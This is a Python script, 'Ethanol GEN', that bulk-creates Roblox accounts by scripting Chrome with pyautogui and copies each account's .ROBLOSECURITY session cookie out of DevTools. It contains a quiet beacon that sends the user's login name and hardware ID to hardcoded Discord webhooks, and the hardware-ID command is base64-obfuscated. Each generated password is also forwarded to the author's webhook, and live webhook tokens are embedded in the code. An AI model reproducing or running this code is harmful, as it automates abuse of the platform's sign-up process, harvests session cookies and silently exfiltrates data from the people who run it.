import subprocess
import tempfile
import os
import random
import time
import pyautogui
import string, pyperclip
from pystyle import Center, Colorate, Colors
from colorama import Fore
from datetime import datetime
import time, re, requests, random
import requests, re, time
from requests import Session
import sys
import socket
import httpx
from pyperclip import copy
import base64
from discord_webhook import DiscordWebhook, DiscordEmbed  
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
def get_hwid():
    command = base64.b64decode("d21pYyBjc3Byb2R1Y3QgZ2V0IHV1aWQ=").decode()  # "wmic csproduct get uuid"
    hwid = subprocess.check_output(command, shell=True).decode().strip().split('\n')[1]
    return hwid
session = Session()

screen_width, screen_height = pyautogui.size()


mypcname = os.getlogin()
ipinfo = httpx.get("https://ipinfo.io/json")
ipinfojson = ipinfo.json()
country = ipinfojson.get('country')
region = ipinfojson.get('region')

hwid = get_hwid()
print("HWID LOADING")

webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/1416698706803163156/AzSmb8-JigNJ1o00EV-r-Fikw1slgjiT0C7VjP6ITbN3TpnL8z4ImTztHp8Rc5JqdFjG') 
embed = DiscordEmbed(
description=f'''**{mypcname} ได้ทำการเปิดโปรแกรม : Ethanol_GEN **
```
HWID : {hwid} \n| PROGRAM Ethanol GEN
```
''', color='FFFF00')
embed.set_footer(text='PROGRAM : {program}',)
webhook.add_embed(embed)
response = webhook.execute()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

timestamp = datetime.now()

r = requests.get("https://raw.githubusercontent.com/7lnte/HWID/refs/heads/main/HWID") # ลิ้งค์ pastebin แบบ raw

def printSlow(text):
    for char in text:
        print(char, end="")
        sys.stdout.flush()
        time.sleep(.1)

clear()
def Main_Program():
    if hwid in r.text:
        os.system('title Hwid Login')
        time.sleep(.1)
        clear()
    else:
        System.Clear()
        System.Title("HWID TOOL EthanolGEN")
        System.Size(100, 45)

        lockreal = r"""
                                     @@@@                @%@@                                      
                               @@@@@@@@@@@@               @@@@@@@@@@%                               
                          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                         
                        %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
                       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                       
                      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     
                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                    
                   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                   
                  %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%                  
                  %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@                  
                  %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%                  
                 %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@                 
                 @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@                 
                 @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%                 
                 %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 
                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                   @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@                   
                      @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@                      
                           @%@@@@@@@                            @@@@@@%%@                           
                                 @@                              @@                     
                                         .-----------------.
                                         |.---------------.|
                                         ||               ||
                                         ||               ||
                                         ||   > R U N     ||
                                         ||               ||
                                         ||               ||
                                         |"---------------"|
                                       .-^-----------------^-.
                                       | ---~  BY Ethanol     |
                                       "---------------------"

                                  ENTER TO STARTS PROGRAM Ethanol GEN
        """[1:]

        Anime.Fade(Center.Center(lockreal), Colors.purple_to_blue, Colorate.Vertical, enter=True)

        def main():
         System.Clear()
        webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/1416698706803163156/AzSmb8-JigNJ1o00EV-r-Fikw1slgjiT0C7VjP6ITbN3TpnL8z4ImTztHp8Rc5JqdFjG') # ลิ้งค์เว็บฮุค
        embed = DiscordEmbed(title='ติด HWID', description=f'```{mypcname} เข้าสู่ระบบไม่สำเร็จ สาเหตุติด HWID```', color='ff0000')
        webhook.add_embed(embed)
        response = webhook.execute()

        print(f"{Fore.LIGHTWHITE_EX}HWID : {hwid} | PROGRAM EthanolGEN")
        copy(f"HWID : {hwid} | PROGRAM Ethanol_GEN")
        exit(9000)  # จะหยุดโปรแกรมและส่งค่าผลลัพธ์ 9000
   


Main_Program()
hwid = get_hwid()
print("HWID PROGRAM Ethanol_GEN:", end=" ")

for char in hwid:
    print(char, end="", flush=True)  # พิมพ์ทีละตัวและทำให้แสดงทันที
    time.sleep(0.1)  # รอ 0.1 วินาที (สามารถปรับเวลาได้ตามต้องการ)
print()  # พิมพ์บรรทัดใหม่หลังจากเสร็จสิ้น
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1373284013510230137/Jt3EcUih4ryPxL6IqMss5HjKUyvlTq28neLaRMKek_6v8-g2tpLsyuZfgEMy6z6tV99-') # ลิ้งค์เว็บฮุค
embed = DiscordEmbed(title='LOGIN | PROGRAM EthanolGEN', description=f'```{mypcname} ได้เข้าสู่ระบบสำเร็จ```', color='24ff00')
webhook.add_embed(embed)
response = webhook.execute()

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pink = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.YELLOW
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET


def get_time_rn():
    date = datetime.now()
    hour = date.hour

    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

def get_relative_coords(x, y):
    return int(screen_width * (x / 1920)), int(screen_height * (y / 1080))

def run_process():
    chrome_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
    temp_dir = tempfile.mkdtemp()
    
    # Read names from RobloxName.txt
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        names_file = os.path.join(script_dir, 'RobloxName.txt')
        with open(names_file, 'r', encoding='utf-8') as f:
            names = [line.strip() for line in f.readlines() if line.strip()]
        
        # Select random name and add underscore + 5 random digits
        random_name = random.choice(names)
        random_numbers = ''.join([str(random.randint(0, 9)) for _ in range(5)])
        username = f"{random_name}_{random_numbers}"
    except Exception as e:
        # Fallback to original method if file reading fails
        random_value = ''.join([str(random.randint(0, 9)) for _ in range(5)])
        username = f"Ethanol_{random_value}"
    
    random_uou = ''.join(random.sample(string.ascii_letters + string.digits, 20))
    Password = f"{random_uou[:16]}"
    
    # Print account info first
    print(f"{reset}{yellow}                                          PROGRAM START | Time = {reset}[ {red}{get_time_rn()}{reset} ]")
    print(f"{reset}                ─────────────────────────────────────────────────────────────────────────────────────")
    print(f"{reset}                 {green}● {pink} Username {gray} : {magenta}{username}")
    print(f"{reset}                 {green}● {pink} Password {gray} : {magenta}{Password}")
    print(f"{reset}                 {green}● {pink} Gender {gray}   : {magenta}MAN")
    
    # Send to Discord immediately
    try:
        webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/1415301994582769745/ZrBAHicufBM6WK8J_V-LGhvMVkIJBkfpITjYzF5KtPlaxEMR2-Gs6laojc7v0SNOUDPZ')
        embed = DiscordEmbed(
            title='✅ NEW ACCOUNT CREATED',
            description=f'**Username:** `{username}`\n**Password:** `{Password}`\n**Gender:** `MAN`',
            color='00FF00'
        )
        webhook.add_embed(embed)
        webhook.execute()
        print(f"{reset}                 {green}✓{pink}  ACCOUNT INFO SENT TO DISCORD")
    except Exception as e:
        print(f"{reset}                 {red}✗{pink}  FAILED TO SEND TO DISCORD: {str(e)}")
    
    # Save to file in script directory
    try:
        # Get the script directory
        script_dir = os.path.dirname(os.path.abspath(__file__))
        output_dir = os.path.join(script_dir, 'Ethanol_Accounts')
        os.makedirs(output_dir, exist_ok=True)
        
        # Create file path
        file_path = os.path.join(output_dir, 'accounts.txt')
        
        # Write account info
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write(f"{username}|{Password}|Gender:Man\n")
        print(f"{reset}                 {green}✓{pink}  ACCOUNT SAVED TO: {file_path}")
    except Exception as e:
        print(f"{reset}                 {red}✗{pink}  FAILED TO SAVE FILE: {str(e)}")
    
    # Start browser and create account
    try:
        subprocess.Popen([chrome_path, f"--user-data-dir={temp_dir}", "--no-first-run", "--no-default-browser-check", "--window-size=540,960", "https://www.roblox.com/CreateAccount?returnUrl=https%3A%2F%2Fwww.roblox.com%2F%3Fnl%3Dtrue"])
        time.sleep(3)
        pyautogui.click(x=278, y=220)
        time.sleep(0.3)
        pyautogui.press("tab")
        time.sleep(0.2)
        pyautogui.write("M", interval=0.1)
        time.sleep(0.2)
        pyautogui.write("M", interval=0.1)
        time.sleep(0.2)
        pyautogui.press("tab")
        time.sleep(0.2)
        pyautogui.write("1", interval=0.1)
        time.sleep(0.1)
        pyautogui.write("1", interval=0.1)
        time.sleep(0.1)
        pyautogui.write("1", interval=0.1)
        time.sleep(0.2)
        pyautogui.press("tab")
        time.sleep(0.2)
        pyautogui.write("1", interval=0.1)
        time.sleep(0.1)
        pyautogui.write("1", interval=0.1)
        time.sleep(0.3)
        pyautogui.press("tab")
        time.sleep(0.3)
        pyautogui.write(username, interval=0.1)
        time.sleep(0.5)
        pyautogui.press("tab")
        time.sleep(0.3)
        pyautogui.write(Password, interval=0.1)
        time.sleep(0.3)
        pyautogui.press("enter")
        time.sleep(0.5)
        pyautogui.press("tab")
        pyautogui.press("tab")
        pyautogui.press("enter")
        time.sleep(0.5)
        pyautogui.click(x=70, y=667) 
        time.sleep(0.5)

        pyautogui.click(x=242, y=764)  
        time.sleep(0.5)

        pyautogui.click(x=302, y=371)
        time.sleep(0.5)
        pyautogui.click(x=302, y=371)
        time.sleep(10)

        pyautogui.hotkey('f12')   
        time.sleep(3)
        pyautogui.click(x=312, y=112)  # แก้แล้ว
        time.sleep(5)
        pyautogui.click(x=351, y=293)  # แก้แล้ว
        time.sleep(0.5)
        pyautogui.click(x=236, y=350) ## Click Cookies ##
        pyautogui.click(x=236, y=350) ## Click Cookies ##
        time.sleep(0.5)
        pyautogui.click(x=259, y=369) ## Click Cookies ##
        time.sleep(0.5)
        pyautogui.click(x=443, y=137) ## Click Copy Cookies ##
        pyautogui.click(x=443, y=137) ## Click Copy Cookies ##
        time.sleep(1)
        pyautogui.write('.ROBLOSECURITY')
        pyautogui.press('enter')
        time.sleep(1)  ## แก้ 
        pyautogui.click(x=416, y=181) ## Click Cookies ##  
        time.sleep(0.5)
        pyautogui.click(x=416, y=181)
        pyautogui.click(x=416, y=181) ## Click Cookies ##
        pyautogui.hotkey('ctrl', 'c')
        time.sleep(0.6)
        pyautogui.click(x=516, y=31) ## Close ##

        copied_data = pyperclip.paste()

        # Close the browser after a short delay
        # Account creation complete
        print(f"{reset}                 {green}✓{pink}  ACCOUNT CREATED SUCCESSFULLY")
        
        # Save account info to file
        output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Ethanol_Accounts')
        os.makedirs(output_dir, exist_ok=True)
        accounts_file = os.path.join(output_dir, 'accounts.txt')
        
        with open(accounts_file, 'a', encoding='utf-8') as f:
            f.write(f"Username: {username}\n")
            f.write(f"Password: {Password}\n")
            f.write(f"Cookie: {copied_data}\n")
            f.write("" * 50 + "\n")
            
        # # Close the browser
        # try:
        #     pyautogui.hotkey("alt", "f4")
        #     time.sleep(1)
        # except:
        #     pass
            
    except Exception as e:
        print(f"{reset}                 {red}✗{pink}  Error during account creation: {str(e)}")
        # try:
        #     pyautogui.hotkey("alt", "f4")
        # except:
        #     pass


def run_multiple_accounts(count):
    for i in range(1, count + 1):
        print(f"\n{reset}                 {green}●{pink}  Creating account {i} of {count}...")
        try:
            run_process()
            print(f"{reset}                 {green}✓{pink}  Account {i} created successfully")
            
            # Send to Discord immediately after creation
            try:
                webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/1415301994582769745/ZrBAHicufBM6WK8J_V-LGhvMVkIJBkfpITjYzF5KtPlaxEMR2-Gs6laojc7v0SNOUDPZ')
                embed = DiscordEmbed(
                    title='✅ NEW ACCOUNT CREATED',
                    description=f'```Account {i} created successful ly```',
                    color='00FF00'
                )
                webhook.add_embed(embed)
                webhook.execute()
                print(f"{reset}                 {green}✓{pink}  Sent account {i} to Discord")
            except Exception as e:
                print(f"{reset}                 {red}✗{pink}  Failed to send to Discord: {str(e)}")
            
            # Add 4 minute delay after each account creation
            if i < count:
                print(f"{reset}                 {yellow}⏳{pink}  Waiting 4 minutes before next account...")
                for remaining in range(240, 0, -1):  # 4 minutes = 240 seconds
                    mins, secs = divmod(remaining, 60)
                    timer = f"{mins:02d}:{secs:02d}"
                    print(f"{reset}                 {yellow}⏳{pink}  Time remaining: {timer}", end="\r")
                    time.sleep(1)
                print("\n" + " " * 50)  # Clear the line after countdown
                print(f"{reset}                 {yellow}⏳{pink}  Preparing next account...")
                
        except Exception as e:
            print(f"{reset}                 {red}✗{pink}  Error creating account {i}: {str(e)}")
            continue

if __name__ == "__main__":
    os.system("cls || clear")
    os.system(f"title Ethanol - ROBLOX Generator - {os.getlogin()}")
    banner = '''

                                                                                                                                                                                                             
 88888888b   dP   dP                                  dP    .d88888b  dP                         
 88          88   88                                  88    88.    "' 88                         
a88aaaa    d8888P 88d888b. .d8888b. 88d888b. .d8888b. 88    `Y88888b. 88d888b. .d8888b. 88d888b. 
 88          88   88'  `88 88'  `88 88'  `88 88'  `88 88          `8b 88'  `88 88'  `88 88'  `88 
 88          88   88    88 88.  .88 88    88 88.  .88 88    d8'   .8P 88    88 88.  .88 88.  .88 
 88888888P   dP   dP    dP `88888P8 dP    dP `88888P' dP     Y88888P  dP    dP `88888P' 88Y888P' 
                                                                                        88       
                                                                                        dP       
                                                                                                
                 ╭────────────────────────────────────────╮
                 │ « Token Generator By Ethanol           │
                 │ « PROGRAM : Generator Account  »       │
                 │ « DC : https://discord.gg/KqvDC4Jqgm » │  
                 ╰────────────────────────────────────────╯
    '''
    print(Colorate.Vertical(Colors.green_to_blue, Center.XCenter(banner), 1))
    
    while True:
        try:
            count = int(input(f"{reset}                 {green}●{pink}  Enter number of accounts to generate: {reset}"))
            if count > 0:
                break
            else:
                print(f"{reset}                 {red}●  Please enter a number greater than 0")
        except ValueError:
            print(f"{reset}                 {red}●  Please enter a valid number")
    
    print(f"\n{reset}                 {green}●{pink}  STARTING TO CREATE {count} ACCOUNTS...")
    run_multiple_accounts(count)
    
    print(f"\n{reset}                 {green}✓{pink}  ALL {count} ACCOUNTS HAVE BEEN CREATED!")
    print(f"{reset}                 {green}✓{pink}  Accounts saved to .output/users.txt")
    input(f"\n{reset}                 {green}●{pink}  PRESS ENTER TO EXIT...")